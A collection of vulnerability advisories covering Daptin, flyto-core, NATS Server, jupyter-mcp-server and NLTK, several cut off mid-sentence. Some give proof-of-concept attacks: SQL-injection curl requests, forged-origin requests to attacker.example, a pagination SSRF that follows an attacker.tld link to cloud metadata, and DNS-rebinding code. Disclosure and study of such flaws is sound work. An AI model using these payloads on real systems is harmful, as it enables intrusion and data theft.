items.summary:
### Summary

Daptin registers a generic WebSocket endpoint, `GET /yjs/:documentName`, for real-time collaborative
document editing (YJS/CRDT). Unlike its purpose-built sibling route, this generic endpoint performs
no per-resource authorization check - it only verifies that *some* user session exists. Because the
document store parses `:documentName` as `typename.referenceId.columnName` and fetches that row's
real column content unconditionally, any authenticated user (including a brand-new, zero-privilege,
self-registered account) can read - and, since YJS sync is bidirectional, also write - the content
of any `file.*`-typed column on any row of any table, including tables that are admin-only by
default.

### Details

`InitializeYjsResources` (`server/endpoint_yjs.go`) registers two routes.

The purpose-built, correctly-secured route, registered once per `file.*`-typed column on every
table:

```go
// server/endpoint_yjs.go:47-113 (abridged)
path := fmt.Sprintf("/live/%v/:referenceId/%v/yjs", typename, columnInfo.ColumnName)
...
return func(ginContext *gin.Context) {
    sessionUser := ...
    if sessionUser == nil { ginContext.AbortWithStatus(403); return }
    ...
    object, _, getErr := cruds[typename].GetSingleRowByReferenceIdWithTransaction(typename, parsedId, nil, tx)
    if getErr != nil { ginContext.AbortWithStatus(404); return }
    ...
    objectPermission := cruds[typename].GetRowPermission(object, tx2)
    if !objectPermission.CanUpdate(user.UserReferenceId, user.Groups, cruds[typename].AdministratorGroupId) {
        ginContext.AbortWithStatus(401)
        return
    }
    roomName := fmt.Sprintf("%v%v%v%v%v", typename, ".", referenceId, ".", columnInfo.ColumnName)
    ...
    yjsConnectionHandler(ginContext.Writer, ginContext.Request)
}
```

This route correctly requires a session, loads the actual row, and checks
`objectPermission.CanUpdate(...)` for the specific requesting user before allowing the WebSocket
upgrade.

A second, generic route is registered right above it, with none of those checks:

```go
// server/endpoint_yjs.go:27-38
defaultRouter.GET("/yjs/:documentName", func(ginContext *gin.Context) {
    sessionUser := ginContext.Request.Context().Value("user")
    if sessionUser == nil {
        ginContext.AbortWithStatus(403)
        return
    }
    yjsConnectionHandler(ginContext.Writer, ginContext.Request)
})
```

The only gate here is "is some session present" - there is no lookup of the referenced row, no
`GetRowPermission`, no `CanUpdate`/`CanRead` check at all. `:documentName` is taken verbatim from
the URL and handed straight to `yjsConnectionHandler`.

The YJS document store's content provider parses `documentName` using exactly the
`typename.referenceId.columnName` convention the secure route builds internally as `roomName`, and
uses it to fetch the real row from the database with no authorization check of its own:

```go
// server/yjs_doucment_provider.go:41-115 (abridged)
ydb.WithInitialContentProvider(func(documentPath string) []byte {
    pathParts := strings.Split(documentPath, ".")
    typeName, referenceId, columnName := pathParts[0], pathParts[1], pathParts[2]
    crud := cruds[typeName]
    object, _, getErr := crud.GetSingleRowByReferenceIdWithTransaction(typeName, parsedId,
        map[string]bool{columnName: true}, tx)
    ...
    // decodes and returns the actual file/column content, base64-decoded, as the
    // initial content of the shared collaborative document
})
```

Because the generic route performs no permission check, any authenticated user can supply
`documentName = "<any table>.<any reference_id>.<any file.* column>"` and the initial YJS sync will
serve them that row's real content - including rows whose table has `DefaultGroups: adminsGroup`
(admin-only by default, e.g. the built-in `calendar` table) or rows an ordinary user's own row-level
permissions would otherwise forbid them from reading. Since YJS sync is bidirectional, a connected

items.summary:
# [CRITICAL] Arbitrary file write via unguarded `data.*` / `file.*` write modules — incomplete fix of GHSA-2956

- **CWE:** CWE-22 (Path Traversal) / CWE-73 (External Control of File Name or Path); impact reaches CWE-94 (code execution via file overwrite).
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **9.3 Critical** (S:C because a write escapes the intended sandbox confinement into the host filesystem / other components).
  - AV:N — reachable via the MCP server / recipe engine (`execute_module`). AC:L — deterministic. PR:L — any client able to run a module/recipe (the same attacker model as GHSA-2956; unauthenticated on the HTTP MCP surface per CVE-2026-55786). UI:N. S:C — escapes `FLYTO_SANDBOX_DIR`. C/I/A:H — arbitrary-content write to any absolute path → overwrite app code / recipes / `~/.bashrc` / cron / `authorized_keys` → RCE.
- **Affected component:** `flyto-core` (PyPI `flyto-core`), HEAD `ae2b38e` (v2.26.7 line). Modules `data.csv.write` (`src/core/modules/atomic/data/csv_write.py`), `data.json_to_csv` (`.../data/json_to_csv.py`), `file.copy` (`.../file/copy.py`), `file.move` (`.../file/move.py`) — and the broader `data.*`/`file.*`/report-writer families that do not call the path guard.
- **Relationship:** **Incomplete fix of GHSA-2956-977x-2w3r** (Critical arbitrary file write, patched in v2.26.6 by commit `d5f89d7`). That fix routed a hand-picked module list (`image.download/convert/resize/crop/compress/rotate/watermark/qrcode_generate`, `document.excel_write/pdf_fill_form/word_to_pdf/pdf_to_word`, `browser.pagination` checkpoint) through `validate_path_with_env_config()`. It did **not** cover the `data.*` and `file.*` write families, which still write a client-controlled path with no confinement.

## Reachability (hop-by-hop, guards resolved)
1. Client invokes a module via the recipe engine / MCP `execute_module` (`src/core/mcp_handler.py`, `mcp_server.py`) — the same surface as GHSA-2956 / CVE-2026-55786.
2. `data.csv.write` reads `file_path = params.get('file_path')` and `data` (both client-controlled). Its only path check is `if '..' in file_path: raise` — a denylist that does **not** block absolute paths.
3. It calls `os.makedirs(os.path.dirname(file_path), exist_ok=True)` then `open(file_path, 'w')` and writes `data`. **No call to `validate_path_with_env_config()`** — so `FLYTO_SANDBOX_DIR` confinement is never applied.
4. `data.json_to_csv` (`output_path`), `file.copy` / `file.move` (`shutil.copy2`/`shutil.move` to `destination`) have **no path check at all**.
5. An absolute path such as `/home/<user>/.bashrc`, `/app/src/core/modules/.../<mod>.py`, or a `.flyto` recipe file is written verbatim, outside the sandbox.

**Guard analysis:** the GHSA-2956 enforcement is per-module (e.g. `image/download.py:21` imports and calls `validate_path_with_env_config`). There is **no central path enforcement** in the runtime — `runtime/languages.py`'s `PathTraversalError` guards *plugin entry-point* loading, not module output paths. So a module that omits the per-module call is entirely unconfined.

## Root cause
The remediation for GHSA-2956 confined writes by adding a per-module `validate_path_with_env_config()` call to an explicit list of modules, rather than enforcing confinement centrally. Any file-writing module absent from that list — the entire `data.*` and `file.*` families here — remains an arbitrary-write primitive. `data.csv.write`'s `'..'`-substring check is a denylist that misses absolute paths.

## Impact
Arbitrary file write with attacker-controlled content and path, escaping `FLYTO_SANDBOX_DIR`. Overwriting a Python module under the install dir, a `.flyto` recipe, a shell rc, a crontab, or `~/.ssh/authorized_keys` yields code execution / full host compromise — the same impact GHSA-2956 was rated Critical for.

## Executable PoC (benign sentinel, local only)
`FLYTO_SANDBOX_DIR` is set to the intended confinement; the module writes *outside* it while the GHSA-2956 guard rejects the same path.

items.summary:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports MQTT clients, including authentication and parsing of MQTT `CONNECT` packets.

### Problem Description

An unauthenticated MQTT client could cause the server to retain large incomplete MQTT `CONNECT` packets before authentication completed.

The parser retained partial pre-authentication packet data while waiting for the advertised MQTT packet length to be completed. An attacker could therefore consume server memory until authentication timeouts closed the connections.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

Deployments not using MQTT are not affected. Deployments that need MQTT should upgrade to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-r72h-j7qq-v6qg>
 * Credit: Asritha Bodepudi, Trail of Bits
items.title: NATS Server allows unauthenticated memory exhaustion through incomplete MQTT CONNECT packets

items.summary:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server can accept client connections over WebSocket and can also support MQTT over WebSocket when MQTT is configured.

### Problem Description

A WebSocket listener could route requests for the MQTT-over-WebSocket path into MQTT handling even when MQTT was not configured.

On affected deployments, an unauthenticated client with access to the WebSocket listener could reach uninitialized MQTT state and crash the server process.

This affects deployments that enable WebSocket while leaving MQTT disabled. Deployments where MQTT is intentionally configured initialize the MQTT state and are not affected in the same way.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

Deployments not using WebSocket are not affected. Deployments using both WebSockets and MQTT are not affected. No known workaround for deployments that need WebSocket without MQTT-over-WebSocket. Upgrade to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p957-7v2w-g93g>
 * Credit: Vasco Franco, Trail of Bits

items.summary:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server MQTT support includes retained messages and QoS1+ durable delivery. NATS subscription permissions can allow broad wildcard subscriptions while denying more sensitive subjects.

### Problem Description

MQTT retained message delivery and QoS1+ durable replay could deliver messages whose original topics matched a subscriber's configured subscribe deny rules.

Normal live delivery applied the delivery-time deny check. These MQTT delivery paths did not consistently recheck the concrete original topic before sending the MQTT `PUBLISH` to the subscriber.

The issue affects MQTT subscribers with broad wildcard subscribe permissions where more specific topics are denied. Normal live delivery can be blocked while retained or replayed delivery still sends the denied topic.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

No known workaround for deployments that require MQTT. Upgrade to a fixed release. Deployments not using MQTT are not affected.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-7qmq-8cc4-hxwg>
 * Credit: Asritha Bodepudi, Trail of Bits

### Summary

An unauthenticated attacker can inject arbitrary SQL through the `sort` query parameter accepted by
Daptin's generic entity list endpoint (`GET /api/<entity>`), which every table in a Daptin instance
exposes. The parameter is concatenated into raw SQL identifiers with no validation that the
referenced column exists, unlike a sibling code path in the same file that received exactly this
validation as the fix for a previously published advisory
([GHSA-rw2c-8rfq-gwfv](https://github.com/daptin/daptin/security/advisories/GHSA-rw2c-8rfq-gwfv)).
Impact ranges from unauthenticated denial of service (a single crafted request 500s the query) to
blind/error-based extraction of data from tables the requester has no permission to read.

### Details

`PaginatedFindAllWithoutFilters` in `server/resource/resource_findallpaginated.go` reads the `sort`
query parameter directly from the request with no validation:

```go
// server/resource/resource_findallpaginated.go:300-302
var sortOrder []string
if len(req.QueryParams["sort"]) > 0 {
    sortOrder = req.QueryParams["sort"]
```

Each entry is then concatenated with the table name and passed to `goqu.I()` (goqu's raw SQL
*identifier* constructor) in two separate places, with no check that the referenced column exists
on the table:

```go
// server/resource/resource_findallpaginated.go:435-449 (SELECT column list)
for _, sort := range sortOrder {
    ...
    if strings.Index(sort, "(") == -1 {
        sort = prefix + sort
    }
    idQueryCols = append(idQueryCols, goqu.I(sort).As(strings.ReplaceAll(sort, ".", "_")))
}
```

```go
// server/resource/resource_findallpaginated.go:916-943 (ORDER BY clause)
for _, so := range sortOrder {
    ...
    orders = append(orders, goqu.I(ord).Asc())
}
```

`goqu.I()` renders its argument by wrapping it in the dialect's quote character (a backtick, in
this build's configured dialect) **without escaping an embedded quote character of the same kind**.
A backtick supplied in `sort` closes the identifier early, and the remainder of the attacker string
is parsed as raw SQL grammar rather than treated as inert column-name text.

This is the same bug class as GHSA-rw2c-8rfq-gwfv ("SQL injection via unvalidated `goqu.L()` calls
in aggregate API", CWE-89, fixed in v0.11.4). That fix added an allow-list check a few hundred lines
later in the same file, in the fuzzy-search code path:

```go
// server/resource/resource_findallpaginated.go:1491-1505
// Validate each column against table schema (prevents SQL injection via goqu.L)
tableInfo := dbResource.tableInfo
var validColumns []string
for _, col := range columns {
    if _, ok := tableInfo.GetColumnByName(col); ok {
        validColumns = append(validColumns, col)
    } else {
        log.Warnf(...)
    }
}
```

The identical validation was never applied to the base `sort` parameter handling earlier in the
same file. Unlike fuzzy search (which requires an explicit `filter` operator to reach), plain `sort`
is processed on every list request to every entity, authenticated or not.

### PoC

Build current HEAD and run it with a fresh SQLite database and no custom schema:

```bash
go build -buildvcs=false -o daptin_bin .
./daptin_bin
```

No account needs to exist. `world` (and most default tables) are guest-readable, so all requests
below are sent with **no `Authorization` header at all**:

```bash
# 1) Reflection -- proves raw, unsanitized concatenation
curl -s -G "http://localhost:6336/api/world" --data-urlencode 'sort=email" --'
# => {"errors":[{"status":"500","title":"no such column: world.email\" --"}]}

# Server log shows the exact constructed query:
# SELECT distinct(user_account.id), `user_account`.`email" --` AS `user_account_email" --`
#   FROM `user_account` LEFT JOIN ... WHERE (...) ORDER BY `user_account`.`email" --` ASC LIMIT ? == [10]

# 2) Backtick breakout -- proves the payload is parsed as SQL grammar, not literal text
curl -s -G "http://localhost:6336/api/user_account" \
    --data-urlencode

Standalone `streamable-http` mode in `datalayer/jupyter-mcp-server` rejects forged `Host` and `Origin` headers on `/mcp`, but custom management routes mounted on the same application do not get the same browser-origin protection. A malicious website can keep an attacker origin while its hostname resolves to `127.0.0.1` or a private target address, then send `PUT /api/connect` to replace the MCP server's active Jupyter backend. The route accepts the browser-shaped request and makes the server start a kernel client against attacker-controlled infrastructure.

The protected `/mcp` endpoint shows the intended browser-origin boundary. With `MCP_TOKEN` configured, `/mcp` rejects forged browser headers:

```text
POST /mcp with Authorization: Bearer SCAN_MCP_TOKEN
Host: attacker.example:8142
Origin: http://attacker.example:8142

HTTP 421 Invalid Host header
```

The vulnerable route is `jupyter_mcp_server/server.py:143-187`. It parses caller JSON, updates the active Jupyter backend configuration, resets `ServerContext`, and starts the kernel without applying the `/mcp` Host/Origin rejection to the custom route:

```python
@mcp.custom_route("/api/connect", ["PUT"])
async def connect(request: Request):
    data = await request.json()

    document_runtime = DocumentRuntime(**data)

    set_config(
        provider=document_runtime.provider,
        runtime_url=document_runtime.runtime_url,
        runtime_id=document_runtime.runtime_id,
        runtime_token=document_runtime.runtime_token,
        document_url=document_runtime.document_url,
        document_id=document_runtime.document_id,
        document_token=document_runtime.document_token,
        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or "notebook_run-all-cells,notebook_get-selected-cell"
    )

    ServerContext.reset()

    try:
        __start_kernel()
        return JSONResponse({"success": True})
```

`/api/stop` is also state-changing and accepts the same browser-origin route shape:

```python
# jupyter_mcp_server/server.py:190-199
@mcp.custom_route("/api/stop", ["DELETE"])
async def stop(request: Request):
    try:
        current_notebook = notebook_manager.get_current_notebook() or "default"
        if current_notebook in notebook_manager:
            notebook_manager.remove_notebook(current_notebook)
        return JSONResponse({"success": True})
```

cd jupyter-mcp-server
git checkout 27b91e551d8bbca2da32c334f9f13267290ff815
python3.12 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
MCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \
  --transport streamable-http \
  --start-new-runtime false \
  --jupyterlab false \
  --mcp-token SCAN_MCP_TOKEN \
  --port 8083
```

First, show that `/mcp` rejects the browser-shaped request:

```http

Host: attacker.example:8083
Origin: http://attacker.example:8083
Authorization: Bearer SCAN_MCP_TOKEN
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
```

```http

```http

Host: attacker.example:8083
Origin: http://attacker.example:8083
Content-Type: application/json

{
  "provider": "jupyter",
  "runtime_url": "http://127.0.0.1:9183",

  "runtime_token": "ATTACKER_TOKEN_REBIND",
  "document_url": "http://127.0.0.1:9183",
  "document_id": "demo.ipynb",
  "document_token": "ATTACKER_TOKEN_REBIND"
}
```

Observed response:

```http
HTTP/1.1 200 OK
content-type: application/json

{"success":true}

## Summary

NLTK 3.10.3 contains security hardening intended to close JVM argument-injection and untrusted JAR/classpath execution paths in `nltk.internals.java()`, including the issue published as GHSA-m4rf-3fr8-xwx3.

The patched `options` channel correctly rejects Java argument-file references such as `@/path/to/args` and launcher modes such as `-jar`. However, an additional argument channel remains: the caller-provided `cmd` sequence is appended to the Java command after the validated option and classpath channels, without enforcing that its first item is a Java main-class name.

I am reporting this as an additional post-fix bypass / incomplete-fix path affecting the 3.10.3 remediation, rather than as an unrelated vulnerability family.

As a result, the same launcher token that is rejected through `options` can be supplied as the first `cmd` item. I confirmed two reachable forms against the official `nltk-3.10.3-py3-none-any.whl`:

1. direct use of the public `nltk.internals.java()` helper with `cmd=["-jar", ...]`; and
2. the higher-level `StanfordSegmenter`, whose public `java_class` constructor argument becomes the first `cmd` item and accepts an `@argfile` launcher token.

Both paths execute an external researcher-controlled JAR without setting `NLTK_ALLOW_UNSAFE_JARS`, `NLTK_ALLOW_UNSAFE_CLASSPATH`, or using `trusted_raw_options`. The original explicit outside-classpath route is blocked in 3.10.3, while the alternate command channel executes the JAR 3/3 times.

## Affected artifact

```text
Package: nltk
Confirmed affected version: 3.10.3
Wheel: nltk-3.10.3-py3-none-any.whl
SHA-256: ff9598a8e20518ee0d557745890cc4435b9578489e2dcbc69c4f81fa060caf7c
```

Baseline artifact:

```text
Version: 3.10.2
Wheel: nltk-3.10.2-py3-none-any.whl
SHA-256: 2c7ccacb765c5e26b0cb60fb1b57080af522c6924d12a714a243305ba3637412
```

## Relationship to the 3.10.3 security fixes

The existing 3.10.3 hardening validates the dedicated per-call `options` list before it reaches `subprocess.Popen`. In particular, the exact `@argfile` token used in this report is rejected through `options` with a `ValueError` that references CVE-2026-12841 and CWE-88.

The command is subsequently assembled in this order:

```python
final_cmd.extend(validated_options)
if classpath_arg is not None:
    final_cmd.extend(["-cp", classpath_arg])
final_cmd.extend(cmd_list)
```

`cmd_list` is copied from the public `cmd` argument but its first token is not checked to ensure that it is an ordinary Java main class. Java therefore interprets leading `-jar`, `@argfile`, module-mode, or classpath-mode tokens as launcher control arguments rather than application arguments.

This is an alternate argument channel around the same JVM argument/JAR execution boundary protected by the 3.10.3 changes.

## Confirmed API paths

### Direct public helper

```python
nltk.internals.java(
    ["-jar", "/outside/trusted/roots/controlled.jar"],
    classpath=None,
    stdout="pipe",
    stderr="pipe",
)
```

The external JAR executed in all three subject runs.

### Higher-level `StanfordSegmenter` path

`StanfordSegmenter` exposes a public `java_class` constructor argument, stores it, and later places it at the beginning of the `cmd` sequence passed to `nltk.internals.java()`.

A controlled argument file containing a `-jar` launcher invocation was supplied as:

```python
StanfordSegmenter(
    path_to_jar=trusted_segmenter_jar,
    java_class="@/path/to/controlled-launcher.args",
    path_to_model="dummy-model",
    java_options=[],
)
```

The trusted segmenter JAR passed the wrapper's checksum and classpath checks. The `@argfile` then switched the Java launcher to the external JAR, which executed in all three runs.

The deprecated wrapper subsequently raised an unrelated post-launch `AttributeError` while processing its output. The external marker had already been written by the child JVM before that exception.

    -> control

### Summary
DependencyGraph.tree()/triples() walk the parsed dependency structure using plain, unbounded Python recursion — one stack frame per edge in the graph — and never use the class's own cycle detector. A crafted dependency-parse file with a few thousand chained tokens (an entirely ordinary-looking long sentence) crashes the process with an unhandled RecursionError the moment .tree() or .triples() is called — which is NLTK's own documented usage pattern immediately after loading such a file.

### Details
`DependencyGraph._tree()` (~lines 393-406), `.tree()` (~408-417), and `.triples()` (~419-432) in `nltk/parse/dependencygraph.py` rebuild/walk the graph with `Tree(word, [self._tree(dep) for dep in deps])` and `yield from self.triples(node=dep)` — ordinary recursive calls, one per edge, with no depth check. `contains_cycle()` is defined on the class (~line 447) but is never invoked by any of these three methods.

This is exactly the CWE-674 pattern the project has already identified and fixed elsewhere: `nltk/tree/tree.py` adds `MAX_TREE_DEPTH = 500` with a comment stating that an arbitrarily deep tree would make every traversal raise RecursionError, and `nltk/test/unit/test_recursion_dos.py` locks in the identical fix for `FeatStructReader`, `LogicParser`, and `ResolutionProver`. But `DependencyGraph` builds its `Tree` objects **programmatically** (`Tree(word, [...])`), which bypasses `MAX_TREE_DEPTH` entirely — that guard only fires inside `Tree.fromstring()`'s bracket-string parser, never in `Tree.__init__`. `DependencyGraph`'s own recursive walk has no depth limit of its own.

Any Malt-TAB/CoNLL(3/4/7/10)-format text — read via `DependencyCorpusReader` (`nltk/corpus/reader/dependency.py`, lines 62-69, backing the public, documented `nltk.corpus.dependency_treebank` and `nltk.corpus.conll2007` corpora) or via the public classmethod `DependencyGraph.load(filename)` (~line 213) / `DependencyGraph(text)` directly — that chains more tokens than Python's default recursion limit (1000) via consecutive head references crashes with an unhandled `RecursionError` the moment `.tree()`/`.triples()` is called. Calling `.tree()` immediately after `parsed_sents()` is not a contrived edge case — it is NLTK's own documented usage pattern (`nltk/test/corpus.doctest`: `print(conll2007.parsed_sents('esp.train')[0].tree())`; `nltk/test/dependency.doctest`: `dg.tree().pprint()`).

**Related observation:** `contains_cycle()` itself has a separate bug that means it wouldn't help even if it were called on this path — it iterates `node["deps"]` as if it were a flat list of neighbor addresses, but `_parse()`/`add_arc()` actually store `deps` as `{relation_label: [addresses]}`; iterating that dict yields relation-label strings, which then fail the `dep not in self.nodes` check and get silently skipped. So `contains_cycle()` returns `False` (a false negative) on real parsed/`add_arc()`-built graphs even when a genuine cycle exists — it only works on the flat-list shape used in its own docstring example. This reinforces that there is no working recursion/cycle safety net on this code path today.

### PoC
A tiny (few KB) 3-column Malt-TAB file: one root line `w1 ROOT 0` followed by ~2000-3000 lines `wi X i-1`, each chaining a token to the previous one (an entirely ordinary-looking long sentence/coordination structure). Verified directly against current source:

1. Constructing a `DependencyGraph` from a 3000-token linear chain and calling `.tree()` → `RecursionError: maximum recursion depth exceeded`. Confirmed.
2. Same graph, `.triples()` fully consumed → `RecursionError`. Confirmed.
3. Full realistic path: wrote the 3000-token chain to a temp file, read it back through an actual `DependencyCorpusReader` (the exact class backing `dependency_treebank`/`conll2007`) via `parsed_sents()`, then called `.tree()` on the result → `RecursionError`, end-to-end through the real public API.

### Summary
The recursive traversal engines behind WordNetCorpusReader's Synset.tree() and Synset.acyclic_tree() have no maximum call-depth safeguard and default to unlimited depth. They guard against literal cycles, but not against a long, genuinely acyclic relation chain — which exhausts the Python call stack the same way as the sibling DependencyGraph finding I reported separately. Real-world exploitability requires the host application to load a custom/foreign WordNet-format lexical resource rather than NLTK's bundled default corpus — flagging that narrower scope honestly up front since it affects severity, not validity.

### Details
`nltk/util.py`'s `acyclic_depth_first()` (~lines 471-541) and `acyclic_branches_depth_first()` (~lines 544-625) recurse once per graph edge, default to `depth=-1` ("unlimited"), and guard against re-visiting the same node via an explicit `traversed` set (hence "acyclic") — but that set only prevents literal cycles, it never bounds how many *distinct* nodes a single call chain may pass through before returning.

`Synset.tree(rel, depth=-1)` (`nltk/corpus/reader/wordnet.py`, ~line 664) calls the recursive `acyclic_branches_depth_first`. There is also a third, easy-to-miss method: `Synset.acyclic_tree()`, a vestigial class-attribute alias for `acyclic_depth_first` — also genuinely recursive and vulnerable.

**Important correction to an earlier draft of this finding:** `Synset.closure(rel, depth=-1)` (~line 609) does **not** share this bug — it actually calls `acyclic_breadth_first()`, a completely different, iterative queue/deque-based function with no recursion at all. I verified this directly: feeding both `acyclic_breadth_first` and the real `Synset.closure()` a 20,000-node genuinely-acyclic chain produces zero crash, while `acyclic_depth_first`/`acyclic_branches_depth_first`/`Synset.tree()`/`Synset.acyclic_tree()` crash reliably at ~1000-1500 nodes on the identical data. Only `.tree()` and `.acyclic_tree()` are affected — not `.closure()`.

This is the same CWE-674 pattern already hardened elsewhere in the codebase (`MAX_TREE_DEPTH` in `tree/tree.py`, `MAX_DEPTH` in `featstruct.py`, `MAX_PARSE_DEPTH` in `logic.py`, `MAX_TABLEAU_DEPTH` in `tableau.py`, `MAX_DECODE_DEPTH` in `jsontags.py`, added by a commit whose message explicitly enumerates the sinks it covers) — but that hardening pass never reached `nltk/util.py` or `wordnet.py`.

**Honest scope-limiting fact:** I exhaustively measured the maximum possible traversal depth across the entire official, bundled WordNet 3.0 corpus (what the overwhelming majority of real deployments use) for every relation NLTK exposes to `tree()`: hypernyms/hyponyms max depth = 18 (across all 74,374 noun synsets); `also_sees` (a relation whose graph isn't curated to stay as shallow as the taxonomy) max eccentricity = 41, largest connected component = 824 nodes; `similar_tos` max eccentricity = 1; entailments/causes/verb_groups/member_holonyms/member_meronyms/attributes all ≤ 11. Every one of these is roughly 25-60x below the ~1000-node crash threshold — there is no word or relation an attacker could pick against the standard bundled corpus that reaches anywhere near a crash. `nltk.app.wordnet_app`, NLTK's own bundled reference consumer, only ever calls `.tree()` with the safe hypernym relation.

Real-world exploitability therefore strictly requires the host application to load a custom/foreign WordNet-format lexical resource — a legitimate, documented, `WordNetCorpusReader`-supported usage, but a comparatively uncommon one — and then call `.tree()`/`.acyclic_tree()` (not `.closure()`) with the default unbounded depth.

### PoC
Generated a syntactically valid, minimal, real Princeton-WordNet-DB-format lexical database (`data.noun`/`index.noun`/`lexnames`/etc., with correct byte-offset-indexed synset records) encoding a 1500-node strictly-linear (genuinely acyclic) hypernym chain. Loaded it via the real, unmodified `WordNetCorpusReader(root, None)`, obtained a rea

items.summary:
# [MEDIUM] SSRF guard bypass via DNS rebinding — validate_url_ssrf resolves-then-connects without pinning

- **CWE:** CWE-918 (SSRF) / CWE-367 (TOCTOU).
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N` = **6.8 Medium** (AC:H — needs attacker-controlled DNS with a low/zero TTL and to flip the answer between the guard's lookup and the connection's lookup; S:C — reaches internal/metadata services the guard is meant to block; C:H — e.g. cloud metadata credentials at 169.254.169.254).
- **Affected component:** `flyto-core` (PyPI `flyto-core`), HEAD `ae2b38e` (v2.26.7). `src/core/utils.py::validate_url_ssrf` (resolution at `getaddrinfo` ~L512, `is_private_ip` check ~L515) and every consumer: `guarded_aiohttp_request()`, `enforce_outbound_url()`/`validate_url_with_env_config()` — i.e. `http.get/request/batch`, `graphql.query/mutation`, `monitor.http_check`, `notification.{slack,discord,teams}`, `ai.vision_analyze`, `verify.visual_diff`, `browser.proxy_rotate`, etc.
- **Relationship:** Incomplete hardening of the SSRF-guard family (**GHSA-pgwh-4jj4-qm8v**, **GHSA-c9hr-64h3-gxpc**, **GHSA-794r-5rp2-fpg8**/CVE-2026-55787). Those fixes added per-module coverage, redirect revalidation, and IPv6-transition range-checks — but none pins the resolved address, so the guard's resolve-then-connect gap defeats all of them.

## Root cause
`validate_url_ssrf()` resolves the hostname with `socket.getaddrinfo()` and rejects the URL if any resolved IP is private. It then returns the **URL string** (hostname intact). The caller (`guarded_aiohttp_request`: `validate_url_with_env_config(url)` then `session.request(method, url, ...)`) hands the hostname to aiohttp, which performs an **independent second DNS resolution** at connect time. The validated IP is never pinned for the connection, so an attacker whose authoritative DNS returns a public A record for the guard's lookup and a private/loopback/metadata address for the connection's lookup reaches internal space. aiohttp resolves via its own resolver, distinct from the guard's `socket.getaddrinfo`, so the two lookups are genuinely separate — one flip is sufficient.

## Reachability
1. Attacker controls DNS for `rebind.attacker.test` (TTL 0), and drives any guarded HTTP module with `url=http://rebind.attacker.test/` (recipe / MCP `execute_module`).
2. Guard: `getaddrinfo` → public IP → `is_private_ip` false → **URL allowed**.
3. Outbound request: aiohttp re-resolves `rebind.attacker.test` → attacker now answers `127.0.0.1` / `169.254.169.254` → connects to the internal target. Redirect revalidation (GHSA-c9hr) does not help — the initial hop already rebinds.

## Executable PoC (benign, local; deterministic)
The attacker's TTL=0 flip is modelled by making `socket.getaddrinfo` return public on lookup #1 (the guard's) and loopback on later lookups (the connection's); a raw local TCP sentinel stands in for the internal service. No payload is sent.

```python

# guard sees resolution #1 (public) -> ALLOWS;  connect re-resolves (127.0.0.1) -> hits sentinel
validate_url_ssrf("http://rebind.attacker.test:8080/")     # ALLOWED
socket.create_connection(("rebind.attacker.test", 8080))   # lands on 127.0.0.1 sentinel
```

Observed output:
```
[guard] validate_url_ssrf ALLOWED http://rebind.attacker.test:8080/  (saw public 93.184.216.34 on resolution #1)
[connect] outbound request re-resolved rebind.attacker.test -> 127.0.0.1 and reached the INTERNAL sentinel: True
BUG CONFIRMED: guard passed but connection reached the private/internal IP (DNS rebinding, no IP pin)
```

- **Is the getaddrinfo monkeypatch cheating?** No — it deterministically models an attacker's TTL=0 authoritative DNS returning different answers to two separate lookups. The code gap is real and unavoidable: `validate_url_with_env_config(url)` resolves once, then `session.request(url)` resolves again with no pin.
- **Does aiohttp's DNS cache prevent it?** No — t

## Summary
`http.paginate` validates only the initial `base_url`, then follows server-supplied pagination targets (RFC 5988 `Link: rel="next"` headers, cursor/offset URLs) in a loop **without revalidating each follow-up URL**. An attacker's first-page response can point `next` at an internal address, causing a second-order SSRF whose internal body is aggregated into the returned items.

## Root Cause
`src/core/modules/atomic/http/paginate.py:495` validates `base_url` (first URL only). The pagination loop `_paginate_link_header` reads `next_url` via `_parse_link_header` (:203), sets `url=next_url` (:208), and calls `session.request(method, url)` (:196) with NO validate call in the loop (:186-208 has zero guard calls).

## Impact
Readable second-order SSRF that bypasses the SSRF control; internal/metadata body aggregated into `all_items` and returned to the caller (C:H, S:C).

## Proof of Concept
Verified live: `http.paginate` with allowlisted base `127.0.0.1` followed a `Link: <http://127.0.0.3/...>; rel="next"` (non-allowlisted) and returned `INTERNAL-NEXTPAGE-SECRET` in the aggregated items.
```
execute_module http.paginate {"url":"http://attacker.tld/p1","strategy":"link_header"}
attacker p1 response header: Link: <http://<cloud-metadata-ip>/latest/meta-data/>; rel="next"
```

## Attack Chain
1. Entry: `http.paginate {url:"http://attacker.tld/p1", strategy:"link_header"}`. Guard: `validate_url_with_env_config(base_url)` (paginate.py:495) — validates the FIRST url only.
2. Sink: `_paginate_link_header` reads `next_url` (`_parse_link_header` :203), `url=next_url` (:208), `session.request(method,url)` (:196) — NO validate call in the loop. Bypass proof: only :495 validates; loop at :186-208 has zero guard calls.
3. Impact: internal body aggregated into `all_items` and returned → readable second-order SSRF.

## Bypass Evidence
Live PoC followed a `Link` header into non-allowlisted loopback and returned the internal marker in aggregated results. Only `base_url` is validated; the follow loop never revalidates.

## Affected Versions
`<= 2.26.6` — `paginate.py:495` + loop present on latest release tag.

## Suggested Fix
Run every follow-up URL (Link header, cursor, offset target) through `validate_url_with_env_config` before fetching it inside the pagination loop.

## Credit

Vulnerability discovered by zx (Jace).

items.summary:
